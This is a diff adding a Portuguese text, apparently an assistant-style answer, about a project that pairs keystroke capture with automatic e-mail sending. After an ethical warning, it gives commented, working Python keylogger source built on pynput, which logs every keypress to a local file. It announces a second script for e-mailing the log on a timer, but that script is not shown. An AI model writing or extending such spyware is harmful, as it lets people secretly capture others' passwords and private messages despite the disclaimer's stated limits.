@@ -1,0 +1,86 @@
+Este é um projeto que combina a captura de teclado com o envio automático de dados por e-mail. Para fins de aprendizado e segurança, é crucial separar o código em duas partes: a Captura Local e o Envio/Agendamento, e garantir que o código de captura esteja robusto (algo que já estávamos trabalhando!).
+
+⚠️ IMPORTANTE: AVISO ÉTICO E LEGAL
+
+O desenvolvimento de keyloggers para monitorar terceiros sem o consentimento deles é ilegal e antiético. O uso deste código deve ser restrito a:
+
+Ambientes de teste e aprendizado (usando o seu próprio computador).
+
+Monitoramento autorizado (ex: controle parental no seu próprio dispositivo, com consentimento).
+
+Irei estruturar e comentar o código focando apenas nos conceitos de programação do Python: manipulação da biblioteca pynput, tratamento de exceções, uso de variáveis globais e agendamento de tarefas (threading.Timer).
+
+Aqui estão os dois scripts corrigidos e detalhados com comentários para explicar o passo a passo.
+
+------------------------------------------------------------------------------------------------------------------------
+
+from pynput import keyboard
+
+# Teclas de modificação que serão ignoradas no log para reduzir o "ruído"
+IGNORAR = {
+    keyboard.Key.shift,
+    keyboard.Key.shift_r,
+    keyboard.Key.shift_l,
+    keyboard.Key.ctrl_l,
+    keyboard.Key.ctrl_r,
+    keyboard.Key.alt_l,
+    keyboard.Key.alt_r,
+    keyboard.Key.caps_lock,
+    keyboard.Key.cmd
+}
+
+# Mapeamento de teclas especiais do Keypad para seus caracteres
+MAPA_KEYPAD = {
+    keyboard.Key.num_divide: '/',
+    keyboard.Key.num_multiply: '*',
+    keyboard.Key.num_subtract: '-',
+    keyboard.Key.num_add: '+',
+    keyboard.Key.num_decimal: '.' 
+}
+
+def on_press(key):  # Função chamada toda vez que uma tecla é pressionada. Aqui, o programa captura a tecla e decide como registrá-la. Abre o arquivo de log no modo 'a' (append) para adicionar o conteúdo ao final.
+    with open("log.txt", "a", encoding="utf-8") as f:
+        try: # 3. Tenta capturar o caractere da tecla (letras, números do teclado principal, símbolos)            
+            if key.char is not None:
+                f.write(key.char)
+                return
+            
+        except AttributeError: # 4. Trata teclas que não possuem o atributo .char (teclas especiais)                      
+            key_name_str = str(key).replace('Key.', '') 
+            
+            # --- Tratamento do Teclado Numérico (Keypad) ---  
+            
+            # A. Tratamento de números do Keypad (ex: 'num_1')                      
+            if key_name_str.startswith('num_') and key_name_str[-1].isdigit():
+                f.write(key_name_str[-1])
+                return
+            
+            # B. Tratamento dos operadores do Keypad
+            if key in MAPA_KEYPAD:
+                f.write(MAPA_KEYPAD[key])
+                return
+
+            # --- Tratamento de Teclas Comuns Especiais ---
+            if key == keyboard.Key.space:
+                f.write(" ") # Registra um espaço
+            elif key == keyboard.Key.enter:
+                f.write("\n") # Registra uma quebra de linha
+            elif key == keyboard.Key.tab:
+                f.write("\t") # Registra um tab
+            elif key == keyboard.Key.backspace:
+                f.write(" [<BACK>] ") # Sugestão: usar uma marcação clara para Backspace
+            elif key == keyboard.Key.esc:
+                f.write(" [ESC] ")
+            elif key in IGNORAR:
+                # Teclas de modificação listadas em IGNORAR são descartadas (pass)
+                pass 
+            else:
+                # Caso seja outra tecla especial (ex: F1, Seta Cima), registra o nome entre colchetes
+                f.write(f"[{key_name_str.upper()}] ") 
+
+# Inicia o Keylogger
+# Aqui o comando 'with keyboard.Listener' cria um ouvinte que chamará 'on_press'
+# a cada tecla pressionada.
+with keyboard.Listener(on_press=on_press) as listener:
+    # listener.join() mantém o script rodando em segundo plano até que seja interrompido (Ctrl+C).
+    listener.join()
